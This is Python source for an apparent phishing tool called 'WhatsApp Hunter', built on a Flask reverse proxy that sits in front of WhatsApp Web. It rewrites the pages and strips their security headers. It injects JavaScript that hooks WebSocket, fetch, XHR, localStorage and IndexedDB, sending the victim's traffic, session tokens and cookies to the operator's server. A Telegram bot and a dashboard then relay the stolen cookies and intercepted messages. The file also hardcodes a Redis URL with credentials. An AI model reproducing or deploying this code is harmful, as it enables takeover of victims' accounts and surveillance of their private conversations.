# whatsapp_hunter.py
# ============================================================
# WhatsApp Web Reverse Proxy — السيطرة الكاملة
# ============================================================

import os
import io
import json
import time
import base64
import hashlib
import threading
import requests
import redis
import re
from urllib.parse import urljoin, urlparse, quote, unquote, urlencode
from flask import Blueprint, request, jsonify, Response, redirect

wa_bp = Blueprint('whatsapp_hunter', __name__)

# ============================================================
# [1] Redis
# ============================================================
REDIS_URL = os.getenv("REDIS_URL", "").strip()
if not REDIS_URL:
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://" + REDIS_URL

try:
    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=10)
    redis_client.ping()
    print("[+] WA Hunter: ✅ Redis connected")
except Exception as e:
    print(f"[-] WA Redis error: {e}")
    redis_client = None

RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")

WA_TARGET = "https://web.whatsapp.com"

# جلسات نشطة: {session_id: {chat_id, cookies, last_seen, messages}}
wa_sessions = {}
wa_sessions_lock = threading.Lock()


# ============================================================
# [2] إدارة الجلسات
# ============================================================
def create_wa_session(session_id, chat_id):
    with wa_sessions_lock:
        wa_sessions[session_id] = {
            "chat_id": chat_id,
            "created_at": time.time(),
            "last_seen": time.time(),
            "cookies": {},
            "headers": {},
            "messages": [],
            "contacts": [],
            "chats": [],
        }
    if redis_client:
        try:
            redis_client.setex(f"wa_session:{session_id}", 86400 * 7, str(chat_id))
        except Exception:
            pass
    return wa_sessions[session_id]


def get_wa_session(session_id):
    with wa_sessions_lock:
        return wa_sessions.get(session_id)


def save_cookie(session_id, name, value, domain="", path="/"):
    """حفظ كوكي"""
    sess = get_wa_session(session_id)
    if not sess:
        return
    key = f"{domain}:{path}:{name}"
    sess["cookies"][key] = {
        "name": name,
        "value": value,
        "domain": domain,
        "path": path,
        "captured_at": time.time()
    }
    # حفظ في Redis
    if redis_client:
        try:
            redis_client.hset(f"wa_cookies:{session_id}", key, value)
        except Exception:
            pass


# ============================================================
# [3] إعادة كتابة HTML
# ============================================================
def rewrite_html_for_proxy(html, session_id, base_url=WA_TARGET):
    """إعادة كتابة كل الروابط لتشير لسيرفرنا"""
    
    proxy_base = f"/wa_proxy?s={session_id}"
    
    # 1) استبدال روابط الموقع المستهدف
    html = html.replace('https://web.whatsapp.com', proxy_base)
    html = html.replace('https://static.whatsapp.net', f"/wa_static?s={session_id}&url=https://static.whatsapp.net")
    html = html.replace('https://www.whatsapp.com', f"/wa_static?s={session_id}&url=https://www.whatsapp.com")
    
    # 2) إعادة كتابة الروابط النسبية
    html = re.sub(
        r'(href|src|action)=["\'](/[^"\']*)["\']',
        lambda m: f'{m.group(1)}="{proxy_base}&url={quote(WA_TARGET + m.group(2))}"',
        html
    )
    
    # 3) حقن JavaScript لاعتراض WebSocket (المفتاح الحقيقي!)
    inject_script = f"""
<script>
(function(){{
  const SESSION_ID = "{session_id}";
  const SERVER = "{RAILWAY_URL}";
  
  // اعتراض WebSocket - هذا هو المفتاح الحقيقي!
  const OrigWS = window.WebSocket;
  window.WebSocket = function(url, protocols) {{
    console.log('[WA] WebSocket intercepted:', url);
    
    // أرسل الـ URL للسيرفر
    try {{
      fetch(SERVER + '/wa_capture', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{
          type: 'ws_url',
          session_id: SESSION_ID,
          url: url
        }})
      }});
    }} catch(e) {{}}
    
    const ws = new OrigWS(url, protocols);
    
    // اعتراض الرسائل الصادرة
    const origSend = ws.send;
    ws.send = function(data) {{
      try {{
        let preview = '';
        if (typeof data === 'string') preview = data.slice(0, 500);
        else if (data instanceof ArrayBuffer) preview = '[binary ' + data.byteLength + ' bytes]';
        else if (data instanceof Blob) preview = '[blob ' + data.size + ' bytes]';
        
        fetch(SERVER + '/wa_capture', {{
          method: 'POST',
          headers: {{'Content-Type': 'application/json'}},
          body: JSON.stringify({{
            type: 'ws_out',
            session_id: SESSION_ID,
            data: preview,
            is_binary: !(typeof data === 'string')
          }})
        }});
      }} catch(e) {{}}
      return origSend.apply(this, arguments);
    }};
    
    // اعتراض الرسائل الواردة
    ws.addEventListener('message', function(e) {{
      try {{
        let preview = '';
        if (typeof e.data === 'string') preview = e.data.slice(0, 500);
        else if (e.data instanceof ArrayBuffer) preview = '[binary ' + e.data.byteLength + ' bytes]';
        
        fetch(SERVER + '/wa_capture', {{
          method: 'POST',
          headers: {{'Content-Type': 'application/json'}},
          body: JSON.stringify({{
            type: 'ws_in',
            session_id: SESSION_ID,
            data: preview
          }})
        }});
      }} catch(e) {{}}
    }});
    
    return ws;
  }};
  
  // اعتراض Fetch
  const origFetch = window.fetch;
  window.fetch = function(url, opts) {{
    try {{
      const urlStr = typeof url === 'string' ? url : url.url;
      fetch(SERVER + '/wa_capture', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{
          type: 'fetch',
          session_id: SESSION_ID,
          url: urlStr,
          method: (opts && opts.method) || 'GET',
          body: opts && opts.body ? String(opts.body).slice(0, 500) : null
        }})
      }});
    }} catch(e) {{}}
    return origFetch.apply(this, arguments);
  }};
  
  // اعتراض XHR
  const origOpen = XMLHttpRequest.prototype.open;
  const origSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function(method, url) {{
    this.__wa_method = method;
    this.__wa_url = url;
    return origOpen.apply(this, arguments);
  }};
  XMLHttpRequest.prototype.send = function(body) {{
    try {{
      fetch(SERVER + '/wa_capture', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{
          type: 'xhr',
          session_id: SESSION_ID,
          url: this.__wa_url,
          method: this.__wa_method,
          body: body ? String(body).slice(0, 500) : null
        }})
      }});
    }} catch(e) {{}}
    return origSend.apply(this, arguments);
  }};
  
  // اعتراض localStorage
  const origSetItem = Storage.prototype.setItem;
  Storage.prototype.setItem = function(k, v) {{
    try {{
      if (k && v && String(v).length < 5000) {{
        fetch(SERVER + '/wa_capture', {{
          method: 'POST',
          headers: {{'Content-Type': 'application/json'}},
          body: JSON.stringify({{
            type: 'storage',
            session_id: SESSION_ID,
            storage_type: this === localStorage ? 'local' : 'session',
            key: k,
            value: String(v)
          }})
        }});
      }}
    }} catch(e) {{}}
    return origSetItem.apply(this, arguments);
  }};
  
  // اعتراض indexedDB
  try {{
    const origOpenIDB = indexedDB.open;
    indexedDB.open = function(name, version) {{
      try {{
        fetch(SERVER + '/wa_capture', {{
          method: 'POST',
          headers: {{'Content-Type': 'application/json'}},
          body: JSON.stringify({{
            type: 'idb_open',
            session_id: SESSION_ID,
            db_name: name
          }})
        }});
      }} catch(e) {{}}
      return origOpenIDB.apply(this, arguments);
    }};
  }} catch(e) {{}}
  
  console.log('[WA Hunter] Injected and active');
}})();
</script>
"""
    
    # حقن السكربت بعد <head>
    if '<head>' in html:
        html = html.replace('<head>', '<head>' + inject_script, 1)
    else:
        html = inject_script + html
    
    return html


# ============================================================
# [4] المسارات
# ============================================================
def init_whatsapp_hunter_routes(app, bot):

    # ============================================================
    # الصفحة الرئيسية
    # ============================================================
    @app.route('/wa', methods=['GET'])
    def wa_landing():
        session_id = request.args.get('s', '')
        chat_id = request.args.get('id', '')
        if not session_id or not chat_id:
            return "Invalid link", 400
        
        try:
            if redis_client:
                stored = redis_client.get(f"wa_session:{session_id}")
                if not stored:
                    # جلسة جديدة
                    create_wa_session(session_id, chat_id)
        except Exception:
            pass
        
        create_wa_session(session_id, chat_id)
        
        # حوّل إلى البروكسي
        return redirect(f"/wa_proxy?s={session_id}&url={quote(WA_TARGET)}")
    
    # ============================================================
    # البروكسي الرئيسي
    # ============================================================
    @app.route('/wa_proxy', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
    def wa_proxy():
        try:
            session_id = request.args.get('s', '')
            target_url = request.args.get('url', WA_TARGET)
            
            if not session_id:
                return "No session", 400
            
            # تأكد من وجود الجلسة
            sess = get_wa_session(session_id)
            if not sess:
                chat_id = "unknown"
                if redis_client:
                    try:
                        chat_id = redis_client.get(f"wa_session:{session_id}") or "unknown"
                    except Exception:
                        pass
                create_wa_session(session_id, chat_id)
                sess = get_wa_session(session_id)
            
            sess["last_seen"] = time.time()
            
            # إذا لم يكن URL كاملاً، أضف النطاق
            if not target_url.startswith(('http://', 'https://')):
                target_url = urljoin(WA_TARGET, target_url)
            
            # ============================================================
            # ★★★ الحصول على كوكيز من Redis
            # ============================================================
            cookies_dict = {}
            if redis_client:
                try:
                    stored_cookies = redis_client.hgetall(f"wa_cookies:{session_id}")
                    for key, val in stored_cookies.items():
                        parts = key.split(":")
                        if len(parts) >= 3:
                            cookie_name = parts[-1]
                            cookies_dict[cookie_name] = val
                except Exception:
                    pass
            
            # ============================================================
            # بناء Headers
            # ============================================================
            headers = {
                "User-Agent": request.headers.get("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
                "Accept": request.headers.get("Accept", "*/*"),
                "Accept-Language": request.headers.get("Accept-Language", "en-US,en;q=0.9,ar;q=0.8"),
                "Accept-Encoding": "identity",  # مهم جداً!
                "Referer": WA_TARGET + "/",
                "Origin": WA_TARGET if request.method == "POST" else None,
            }
            # احذف None
            headers = {k: v for k, v in headers.items() if v is not None}
            
            # Host
            parsed = urlparse(target_url)
            headers["Host"] = parsed.netloc
            
            # ============================================================
            # تنفيذ الطلب
            # ============================================================
            resp = None
            try:
                if request.method == 'GET':
                    resp = requests.get(
                        target_url,
                        headers=headers,
                        cookies=cookies_dict,
                        allow_redirects=False,
                        timeout=30,
                        verify=False
                    )
                elif request.method == 'POST':
                    # استخراج بيانات POST
                    if 'application/json' in request.headers.get('Content-Type', ''):
                        body = request.get_data()
                        headers['Content-Type'] = 'application/json'
                    elif 'application/x-www-form-urlencoded' in request.headers.get('Content-Type', ''):
                        body = request.get_data()
                        headers['Content-Type'] = 'application/x-www-form-urlencoded'
                    else:
                        body = request.get_data()
                    
                    resp = requests.post(
                        target_url,
                        headers=headers,
                        cookies=cookies_dict,
                        data=body,
                        allow_redirects=False,
                        timeout=30,
                        verify=False
                    )
                else:
                    resp = requests.request(
                        request.method,
                        target_url,
                        headers=headers,
                        cookies=cookies_dict,
                        data=request.get_data(),
                        allow_redirects=False,
                        timeout=30,
                        verify=False
                    )
            except Exception as e:
                print(f"[-] WA proxy request error: {e}")
                return f"Proxy error: {e}", 502
            
            # ============================================================
            # ★★★ التقاط الكوكيز من الرد
            # ============================================================
            for cookie in resp.cookies:
                save_cookie(session_id, cookie.name, cookie.value, cookie.domain or parsed.netloc, cookie.path or "/")
                print(f"[+] WA Cookie captured: {cookie.name}={cookie.value[:30]}...")
            
            # محاولة التقاط كوكيز من Set-Cookie header
            set_cookie = resp.headers.get("Set-Cookie", "")
            if set_cookie:
                try:
                    for line in set_cookie.split(","):
                        if "=" in line:
                            parts = line.split(";")[0].strip().split("=", 1)
                            if len(parts) == 2:
                                save_cookie(session_id, parts[0], parts[1], parsed.netloc, "/")
                except Exception:
                    pass
            
            # ============================================================
            # بناء الرد
            # ============================================================
            content_type = resp.headers.get("Content-Type", "").lower()
            
            # إذا HTML → أعد الكتابة
            if "text/html" in content_type:
                try:
                    html = resp.content.decode('utf-8', errors='ignore')
                    html = rewrite_html_for_proxy(html, session_id, target_url)
                    
                    response = Response(html, status=resp.status_code, content_type="text/html; charset=utf-8")
                    
                    # انقل الكوكيز
                    for k, v in resp.headers.items():
                        if k.lower() not in ['content-encoding', 'content-length', 'transfer-encoding',
                                              'content-security-policy', 'x-frame-options',
                                              'strict-transport-security']:
                            try:
                                response.headers[k] = v
                            except Exception:
                                pass
                    
                    return response
                except Exception as e:
                    print(f"[-] HTML rewrite error: {e}")
                    return Response(resp.content, status=resp.status_code, content_type=content_type)
            
            # إذا JSON → اعرضه كما هو (لكن سجّل البيانات)
            elif "application/json" in content_type:
                try:
                    json_data = resp.json()
                    # سجل البيانات المهمة
                    _capture_json_data(session_id, target_url, json_data)
                except Exception:
                    pass
                return Response(resp.content, status=resp.status_code, content_type=content_type)
            
            # أي نوع آخر → مرره كما هو
            else:
                return Response(resp.content, status=resp.status_code, content_type=content_type)
        
        except Exception as e:
            print(f"[-] wa_proxy FATAL: {e}")
            import traceback
            traceback.print_exc()
            return f"Server error: {e}", 500
    
    # ============================================================
    # استقبال البيانات من JavaScript المحقون
    # ============================================================
    @app.route('/wa_capture', methods=['POST'])
    def wa_capture():
        try:
            data = request.get_json(silent=True) or {}
            session_id = data.get('session_id')
            dtype = data.get('type')
            
            if not session_id:
                return jsonify({"status": "no_session"}), 200
            
            sess = get_wa_session(session_id)
            if not sess:
                return jsonify({"status": "no_sess_obj"}), 200
            
            sess["last_seen"] = time.time()
            chat_id = sess.get("chat_id")
            
            # حفظ البيانات
            if dtype == 'ws_url':
                url = data.get('url', '')
                print(f"[WA] WebSocket URL: {url[:100]}")
                # أبلغ المستخدم
                try:
                    bot.send_message(int(chat_id),
                        f"🔌 **WebSocket URL مكتشف**\n"
                        f"`{url[:200]}`",
                        parse_mode="Markdown")
                except Exception:
                    pass
            
            elif dtype == 'ws_out':
                # رسالة خارجة من الضحية
                preview = data.get('data', '')
                if preview and len(preview) > 20:
                    print(f"[WA] WS Out: {preview[:200]}")
                    # حفظ في الجلسة
                    sess["messages"].append({
                        "direction": "out",
                        "data": preview,
                        "ts": time.time()
                    })
                    # أبلغ المستخدم إذا كانت رسالة مهمة
                    _notify_important_message(bot, chat_id, "out", preview)
            
            elif dtype == 'ws_in':
                # رسالة واردة
                preview = data.get('data', '')
                if preview and len(preview) > 20:
                    print(f"[WA] WS In: {preview[:200]}")
                    sess["messages"].append({
                        "direction": "in",
                        "data": preview,
                        "ts": time.time()
                    })
                    _notify_important_message(bot, chat_id, "in", preview)
            
            elif dtype == 'fetch':
                url = data.get('url', '')
                method = data.get('method', 'GET')
                # التقط أي URL مهم
                if 'wss://' in url or 'media' in url or 'message' in url.lower():
                    print(f"[WA] Fetch: {method} {url[:150]}")
            
            elif dtype == 'storage':
                key = data.get('key', '')
                value = data.get('value', '')
                storage_type = data.get('storage_type', 'local')
                
                # احفظ في Redis
                if redis_client:
                    try:
                        redis_client.hset(
                            f"wa_storage:{session_id}",
                            f"{storage_type}:{key}",
                            value[:5000]
                        )
                    except Exception:
                        pass
                
                # إذا كان WA Web session tokens
                if 'wa' in key.lower() or 'token' in key.lower() or 'session' in key.lower():
                    print(f"[WA] Storage: {key} = {value[:100]}")
                    try:
                        bot.send_message(int(chat_id),
                            f"💾 **LocalStorage مكتشف**\n"
                            f"🔑 `{key}`\n"
                            f"📝 `{value[:500]}`",
                            parse_mode="Markdown")
                    except Exception:
                        pass
            
            elif dtype == 'idb_open':
                db_name = data.get('db_name', '')
                print(f"[WA] IndexedDB: {db_name}")
                sess["info"] = sess.get("info", {})
                sess["info"].setdefault("indexeddb", [])
                if db_name not in sess["info"]["indexeddb"]:
                    sess["info"]["indexeddb"].append(db_name)
            
            return jsonify({"status": "ok"}), 200
        
        except Exception as e:
            print(f"[-] wa_capture error: {e}")
            return jsonify({"status": "error"}), 200
    
    # ============================================================
    # Static files proxy
    # ============================================================
    @app.route('/wa_static', methods=['GET'])
    def wa_static():
        try:
            url = request.args.get('url', '')
            if not url:
                return "No URL", 400
            
            headers = {
                "User-Agent": request.headers.get("User-Agent", "Mozilla/5.0"),
                "Accept-Encoding": "identity",
            }
            
            resp = requests.get(url, headers=headers, timeout=30, verify=False)
            
            content_type = resp.headers.get("Content-Type", "application/octet-stream")
            return Response(resp.content, status=resp.status_code, content_type=content_type)
        
        except Exception as e:
            return f"Static proxy error: {e}", 502
    
    # ============================================================
    # إنشاء جلسة
    # ============================================================
    @app.route('/wa_create', methods=['POST'])
    def wa_create():
        data = request.get_json(silent=True) or {}
        chat_id = data.get('chat_id')
        if not chat_id:
            return jsonify({"error": "missing chat_id"}), 400
        session_id = data.get('session_id')
        if not session_id:
            import uuid as _uuid
            session_id = str(_uuid.uuid4()).replace('-', '')[:24]
        create_wa_session(session_id, chat_id)
        return jsonify({"session_id": session_id}), 200
    
    # ============================================================
    # لوحة تحكم الجلسة
    # ============================================================
    @app.route('/wa_dashboard', methods=['GET'])
    def wa_dashboard():
        session_id = request.args.get('s', '')
        if not session_id:
            return "No session", 400
        
        sess = get_wa_session(session_id)
        if not sess:
            return "Session not found", 404
        
        return render_wa_dashboard(session_id, sess)


# ============================================================
# [5] التقاط البيانات المهمة
# ============================================================
def _capture_json_data(session_id, url, json_data):
    """التقاط بيانات JSON المهمة"""
    sess = get_wa_session(session_id)
    if not sess:
        return
    
    # التقاط المحادثات
    if 'chats' in str(json_data)[:1000]:
        sess["chats"] = json_data
    
    # التقاط جهات الاتصال
    if 'contacts' in str(json_data)[:1000] or 'phoneNumber' in str(json_data)[:1000]:
        sess["contacts"] = json_data


def _notify_important_message(bot, chat_id, direction, data):
    """إبلاغ المستخدم بالرسائل المهمة"""
    try:
        # تجاهل الرسائل القصيرة أو غير المهمة
        if not data or len(data) < 30:
            return
        
        # الكشف عن الأنماط المهمة
        important_patterns = [
            'message', 'chat', 'contact', 'phone', 'media',
            'text', 'body', 'from', 'to', 'author'
        ]
        
        data_lower = data.lower()
        if any(p in data_lower for p in important_patterns):
            emoji = "📤" if direction == "out" else "📥"
            bot.send_message(
                int(chat_id),
                f"{emoji} **رسالة {direction == 'out' and 'صادرة' or 'واردة'} من WhatsApp**\n"
                f"```\n{data[:500]}\n```",
                parse_mode="Markdown"
            )
    except Exception as e:
        print(f"[-] notify error: {e}")


# ============================================================
# [6] لوحة التحكم
# ============================================================
def render_wa_dashboard(session_id, sess):
    cookies = sess.get("cookies", {})
    messages = sess.get("messages", [])
    
    # جلب من Redis
    stored_cookies = {}
    if redis_client:
        try:
            stored_cookies = redis_client.hgetall(f"wa_cookies:{session_id}") or {}
        except Exception:
            pass
    
    cookie_rows = ""
    for k, v in list(stored_cookies.items())[:50]:
        cookie_rows += f'<tr><td><code>{k}</code></td><td><code>{v[:80]}</code></td></tr>'
    
    msg_rows = ""
    for m in messages[-50:]:
        direction = "📤" if m.get("direction") == "out" else "📥"
        data = (m.get("data") or "")[:200]
        msg_rows += f'<tr><td>{direction}</td><td><code>{data}</code></td></tr>'
    
    html = f"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>WhatsApp Session Dashboard</title>
<style>
  body {{ font-family: -apple-system, sans-serif; background: #0b1120;
    color: #f8fafc; margin: 0; padding: 20px; }}
  .container {{ max-width: 1200px; margin: 0 auto; }}
  h1 {{ color: #38bdf8; margin-bottom: 20px; }}
  .card {{ background: #1e293b; border-radius: 12px; padding: 20px;
    margin-bottom: 20px; border: 1px solid #334155; }}
  .card h2 {{ margin-top: 0; color: #94a3b8; font-size: 16px; }}
  table {{ width: 100%; border-collapse: collapse; font-size: 13px; }}
  th {{ text-align: right; padding: 8px; border-bottom: 1px solid #334155;
    color: #64748b; }}
  td {{ padding: 8px; border-bottom: 1px solid #1e293b; }}
  code {{ background: #0f172a; padding: 2px 6px; border-radius: 4px;
    color: #4ade80; font-family: monospace; font-size: 12px; }}
  .stats {{ display: flex; gap: 12px; flex-wrap: wrap; }}
  .stat {{ background: #0f172a; padding: 16px 24px; border-radius: 8px;
    border: 1px solid #334155; }}
  .stat-num {{ font-size: 28px; color: #38bdf8; font-weight: 700; }}
  .stat-label {{ font-size: 12px; color: #64748b; margin-top: 4px; }}
</style>
</head>
<body>
<div class="container">
  <h1>📱 WhatsApp Session Dashboard</h1>
  
  <div class="card">
    <div class="stats">
      <div class="stat">
        <div class="stat-num">{len(stored_cookies)}</div>
        <div class="stat-label">كوكيز مسروقة</div>
      </div>
      <div class="stat">
        <div class="stat-num">{len(messages)}</div>
        <div class="stat-label">رسائل مراقبة</div>
      </div>
      <div class="stat">
        <div class="stat-num">{len(sess.get('contacts', []))}</div>
        <div class="stat-label">جهات اتصال</div>
      </div>
    </div>
  </div>
  
  <div class="card">
    <h2>🍪 الكوكيز المستلمة</h2>
    <table>
      <tr><th>الاسم</th><th>القيمة</th></tr>
      {cookie_rows if cookie_rows else '<tr><td colspan="2" style="text-align:center;color:#64748b;">لا توجد كوكيز بعد</td></tr>'}
    </table>
  </div>
  
  <div class="card">
    <h2>💬 آخر الرسائل المراقبة</h2>
    <table>
      <tr><th>الاتجاه</th><th>البيانات</th></tr>
      {msg_rows if msg_rows else '<tr><td colspan="2" style="text-align:center;color:#64748b;">لا توجد رسائل بعد</td></tr>'}
    </table>
  </div>
</div>
</body>
</html>"""
    return html, 200


# ============================================================
# [7] لوحة تحكم البوت
# ============================================================
def build_wa_panel(session_id, chat_id):
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    m = InlineKeyboardMarkup()
    m.row(
        InlineKeyboardButton("🍪 الكوكيز", callback_data=f"wa_cookies_{session_id}"),
        InlineKeyboardButton("💬 الرسائل", callback_data=f"wa_msgs_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("👥 جهات الاتصال", callback_data=f"wa_contacts_{session_id}"),
        InlineKeyboardButton("📊 إحصائيات", callback_data=f"wa_stats_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("📥 تصدير الجلسة", callback_data=f"wa_export_{session_id}"),
        InlineKeyboardButton("🌐 لوحة الويب", callback_data=f"wa_web_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("🗑️ حذف الجلسة", callback_data=f"wa_delete_{session_id}"),
    )
    return m


# ============================================================
# [8] الحصول على بيانات الجلسة
# ============================================================
def get_wa_session_data(session_id):
    """يرجع بيانات الجلسة كاملة"""
    sess = get_wa_session(session_id)
    if not sess:
        return None
    
    # اجمع من Redis
    cookies = {}
    storage = {}
    if redis_client:
        try:
            cookies = redis_client.hgetall(f"wa_cookies:{session_id}") or {}
            storage = redis_client.hgetall(f"wa_storage:{session_id}") or {}
        except Exception:
            pass
    
    return {
        **sess,
        "cookies_from_redis": cookies,
        "storage_from_redis": storage
}
